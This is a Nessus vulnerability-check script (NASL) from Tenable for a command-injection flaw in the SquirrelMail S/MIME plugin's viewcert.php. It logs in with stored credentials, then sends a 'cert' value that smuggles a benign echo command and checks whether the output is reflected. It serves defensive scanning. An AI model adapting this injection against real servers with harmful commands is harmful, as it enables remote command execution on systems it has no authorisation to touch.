#
# (C) Tenable Network Security
#

if(description) {
  script_id(17257);
  script_version("$Revision: 1.2 $");

  script_cve_id("CAN-2005-0239");
  script_bugtraq_id(12467);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"13639");
  }
 
  name["english"] = "SquirrelMail S/MIME Plug-in Remote Command Execution Vulnerability";
  script_name(english:name["english"]);

  desc["english"] = "
The S/MIME plugin for SquirrelMail installed on the remote host does
not sanitize the 'cert' parameter used by the viewcert.php script.  An
authenticated user can exploit this flaw to execute system commands
remotely in the context of the web server. 

Solution : Upgrade to version 0.6 or later of the plugin.
Risk factor : High";
  script_description(english:desc["english"]);

  summary["english"] = "Checks for remote command execution vulnerability in SquirrelMail S/MIME Plugin";
  script_summary(english:summary["english"]);

  script_category(ACT_ATTACK);
  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_require_ports("Services/www", 80);
  script_dependencies("global_settings.nasl", "http_version.nasl", "squirrelmail_detect.nasl");
  script_require_keys("imap/login");
  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


# nb: the only way to check for the vulnerability is to exploit it,
#     which requires we log in.
user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  if (log_verbosity > 1) display("imap/login and/or imap/password are empty; ", SCRIPT_NAME, " skipped!\n");
  exit(1);
}


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/squirrelmail"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Make sure the plugin's installed.
  req = http_get(item:string(dir, "/plugins/smime/viewcert.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) exit(0);
  if (string('a href="', dir, '/src/login.php"') >!< res) exit(0);

  # Now log in.
  req = http_get(item:string(dir, "/src/login.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) exit(0);
  # - first grab the session cookie.
  pat = "Set-Cookie: SQMSESSID=(.+); path=";
  matches = egrep(pattern:pat, string:res, icase:TRUE);
  foreach match (split(matches)) {
    match = chomp(match);
    sid = eregmatch(pattern:pat, string:match);
    if (sid == NULL) break;
    sid = sid[1];
    break;
  }
  if (isnull(sid)) {
    if (log_verbosity > 1) display("can't get session cookie; ", SCRIPT_NAME, " skipped!\n");
    exit(1);
  }
  # - now send the username / password.
  postdata = string("login_username=", user, "&secretkey=", pass, "&js_autodetect_results=0&just_logged_in=1");
  req = string(
    "POST ",  dir, "/src/redirect.php HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Cookie: SQMSESSID=", sid, "\r\n",
    "Content-Type: application/x-www-form-urlencoded\r\n",
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) exit(0);
  if ("Set-Cookie: SQMSESSID=deleted;" >< res) {
    if (log_verbosity > 1) display("user/password incorrect; ", SCRIPT_NAME, " skipped!\n");
    exit(1);
  }
  # - and get the secret key.
  pat = "Set-Cookie: key=(.+); path=";
  matches = egrep(pattern:pat, string:res, icase:TRUE);
  foreach match (split(matches)) {
    match = chomp(match);
    key = eregmatch(pattern:pat, string:match);
    if (key == NULL) break;
    key = key[1];
    break;
  }

  # Finally, try to exploit the flaw by having it display "Nessus was here"
  # in the Owner field.
  req = http_get(item:string(dir, "/plugins/smime/viewcert.php?cert=;echo%20subject=Nessus%20was%20here;"), port:port);
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Cookie: key=", key, "; SQMSESSID=", sid, "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req);

  # If "Nessus was here" appears in the Owner field, it's a problem.
  if (res =~ "Owner:.+Nessus was here") {
    security_hole(port);
  }
}
